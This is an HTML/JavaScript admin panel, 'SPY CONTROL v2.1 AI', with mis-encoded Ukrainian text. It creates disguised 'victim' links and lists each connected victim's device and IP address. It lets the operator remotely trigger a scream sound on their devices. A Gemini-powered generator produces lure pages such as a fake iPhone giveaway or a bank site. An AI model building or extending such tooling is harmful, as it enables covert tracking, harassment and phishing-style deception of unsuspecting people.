<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPY CONTROL v2.1 AI</title>
    <style>
        :root {
            --neon: #00ff99;
            --danger: #ff0055;
            --bg: #0a0a0c;
            --card: #16161a;
            --ai-glow: #6200ea;
        }
        body { 
            background-color: var(--bg); color: white; 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            display: flex; justify-content: center; padding: 20px; margin: 0;
            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #0a0a0c 100%);
        }
        .container { 
            width: 100%; max-width: 450px; background: var(--card); 
            padding: 25px; border-radius: 20px; border: 1px solid #333;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { font-size: 22px; letter-spacing: 2px; text-transform: uppercase; color: var(--neon); text-align: center; margin-bottom: 25px; }
        
        input, textarea { 
            width: 100%; padding: 12px; background: #0f0f12; border: 1px solid #333; 
            color: white; border-radius: 10px; box-sizing: border-box; outline: none; margin-bottom: 10px;
        }
        input:focus, textarea:focus { border-color: var(--neon); }
        
        button { 
            width: 100%; padding: 14px; border: none; border-radius: 10px; 
            cursor: pointer; font-size: 14px; font-weight: bold; transition: 0.3s;
        }

        /* AI Section */
        .ai-container {
            border: 1px dashed var(--ai-glow); border-radius: 15px;
            padding: 15px; background: rgba(98, 0, 234, 0.05); margin-bottom: 20px;
        }
        .btn-ai-main { background: var(--ai-glow); color: white; margin-bottom: 10px; }
        #ai-status { font-size: 11px; color: #b388ff; text-align: center; margin-top: 10px; }

        /* Control Panel */
        .btn-create { background: var(--neon); color: black; }
        .btn-scare { 
            background: var(--danger); color: white; height: 70px; font-size: 20px; 
            display: none; margin-top: 15px; animation: pulse 1.5s infinite;
        }
        .link-box { 
            background: #000; padding: 12px; border-radius: 8px; font-family: monospace; 
            font-size: 11px; margin: 15px 0; border: 1px solid #333; word-break: break-all;
        }
        .history-item { 
            background: #1c1c21; padding: 12px; margin-bottom: 8px; border-radius: 10px; 
            display: flex; justify-content: space-between; align-items: center; border: 1px solid #333;
        }
        
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,0,85,0.7); } 70% { box-shadow: 0 0 0 12px rgba(255,0,85,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,85,0); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>üëÅÔ∏è SPY ADMIN AI</h1>

        <div class="ai-container">
            <button class="btn-ai-main" onclick="toggleAI()">ü§ñ –ì–ï–ù–ï–†–£–í–ê–¢–ò –°–ê–ô–¢ (Gemini 2.0)</button>
            <div id="ai-form" style="display: none;">
                <textarea id="ai-prompt" placeholder="–û–ø–∏—à—ñ—Ç—å —Ç–µ–º–∞—Ç–∏–∫—É —Å–∞–π—Ç—É (–Ω–∞–ø—Ä. –†–æ–∑—ñ–≥—Ä–∞—à iPhone 15, —Å–∞–π—Ç –±–∞–Ω–∫—É, —Å—Ç—Ä–∞—à–Ω–∏–π –∫–≤–µ—Å—Ç)"></textarea>
                <button onclick="runAIGeneration()" style="background: var(--neon); color: #000;">–ó–ê–ü–£–°–¢–ò–¢–ò –®–Ü</button>
            </div>
            <div id="ai-status"></div>
        </div>

        <div id="setup-step">
            <input type="text" id="imgUrl" placeholder="URL –ö–∞—Ä—Ç–∏–Ω–∫–∏ (–Ω–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ)">
            <input type="text" id="sndUrl" placeholder="URL –ó–≤—É–∫—É (.mp3)" value="https://www.myinstants.com/media/sounds/scream.mp3">
            <button class="btn-create" onclick="createLink()">–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£ –í–†–£–ß–ù–£</button>
        </div>

        <div id="control-panel" style="display: none;">
            <div class="link-box">
                <div style="color: #666; margin-bottom: 5px;">–ü–û–°–ò–õ–ê–ù–ù–Ø –î–õ–Ø –ñ–ï–†–¢–í–ò:</div>
                <a id="victim-link" href="#" target="_blank" style="color: var(--neon); text-decoration: none;">...</a>
            </div>
            
            <div id="users-list" style="margin-bottom: 10px;"></div>
            <button id="scare-btn" class="btn-scare" onclick="trigger()">–ù–ê–õ–Ø–ö–ê–¢–ò üíÄ</button>
            
            <button onclick="location.reload()" style="background: #222; margin-top: 15px; font-size: 12px;">‚¨Ö –ù–ê–ó–ê–î –î–û –Ü–°–¢–û–†–Ü–á</button>
        </div>

        <div id="history-panel">
            <h3 style="color: #444; font-size: 12px; margin-top: 20px;">–û–°–¢–ê–ù–ù–Ü –°–ï–°–Ü–á</h3>
            <div id="history-list"></div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let currentSessionId = null;

        window.onload = loadHistory;

        function toggleAI() {
            const form = document.getElementById('ai-form');
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
        }

        async function createLink() {
            const image = document.getElementById('imgUrl').value.trim();
            const sound = document.getElementById('sndUrl').value.trim();
            const res = await fetch('/create', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ image, sound })
            });
            const data = await res.json();
            saveToHistory(data.id);
            activateRoom(data.id);
        }

        async function runAIGeneration() {
            const prompt = document.getElementById('ai-prompt').value;
            const status = document.getElementById('ai-status');
            if(!prompt) return alert("–í–≤–µ–¥—ñ—Ç—å –æ–ø–∏—Å!");

            status.innerText = "‚è≥ Gemini 2.0 –≥–µ–Ω–µ—Ä—É—î –∫–æ–¥...";

            // –Ø–∫—â–æ —Å–µ—Å—ñ—ó —â–µ –Ω–µ–º–∞—î, —Å—Ç–≤–æ—Ä—é—î–º–æ —ó—ó
            if (!currentSessionId) {
                const res = await fetch('/create', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image: '', sound: document.getElementById('sndUrl').value })
                });
                const data = await res.json();
                currentSessionId = data.id;
                saveToHistory(currentSessionId);
            }

            try {
                const res = await fetch('/generate-ai-page', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sessionId: currentSessionId, prompt })
                });
                const data = await res.json();
                if(data.success) {
                    status.innerHTML = `‚úÖ –ì–æ—Ç–æ–≤–æ! <br><a href="${data.url}" target="_blank" style="color:var(--neon)">–í–Ü–î–ö–†–ò–¢–ò –°–ê–ô–¢</a>`;
                    activateRoom(currentSessionId, data.url);
                } else {
                    status.innerText = "‚ùå –ü–æ–º–∏–ª–∫–∞: " + data.error;
                }
            } catch (e) {
                status.innerText = "‚ùå –°–µ—Ä–≤–µ—Ä –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î";
            }
        }

        function activateRoom(id, customPath = null) {
            currentSessionId = id;
            document.getElementById('setup-step').style.display = 'none';
            document.getElementById('history-panel').style.display = 'none';
            document.getElementById('control-panel').style.display = 'block';
            
            const path = customPath || `/victim.html?id=${id}`;
            const link = window.location.origin + path;
            document.getElementById('victim-link').href = path;
            document.getElementById('victim-link').innerText = link;
            
            socket.emit('join-room-admin', id);
        }

        function trigger() {
            if(currentSessionId) socket.emit('trigger-scare', currentSessionId);
        }

        socket.on('update-victim-list', (users) => {
            const listDiv = document.getElementById('users-list');
            const scareBtn = document.getElementById('scare-btn');
            if (users.length > 0) {
                scareBtn.style.display = 'block';
                listDiv.innerHTML = users.map(u => `<div style="color:var(--neon); font-size:12px; padding:5px; border-bottom:1px solid #222;">üì± ${u.device} (${u.ip})</div>`).join('');
            } else {
                scareBtn.style.display = 'none';
                listDiv.innerHTML = '<div style="color:#444; font-size:12px;">–û—á—ñ–∫—É–≤–∞–Ω–Ω—è –ø—ñ–¥–∫–ª—é—á–µ–Ω—å...</div>';
            }
        });

        function saveToHistory(id) {
            let list = JSON.parse(localStorage.getItem('prank_rooms') || '[]');
            if (!list.find(i => i.id === id)) {
                list.unshift({ id, date: new Date().toLocaleString() });
                localStorage.setItem('prank_rooms', JSON.stringify(list.slice(0, 10)));
            }
        }

        async function loadHistory() {
            const list = JSON.parse(localStorage.getItem('prank_rooms') || '[]');
            const container = document.getElementById('history-list');
            if (list.length === 0) return;

            list.forEach(item => {
                const div = document.createElement('div');
                div.className = 'history-item';
                div.innerHTML = `<div style="cursor:pointer" onclick="activateRoom('${item.id}')">üÜî ...${item.id.slice(-6)} <span style="color:#555; font-size:10px;">${item.date}</span></div>`;
                container.appendChild(div);
            });
        }
    </script>
</body>
</html>
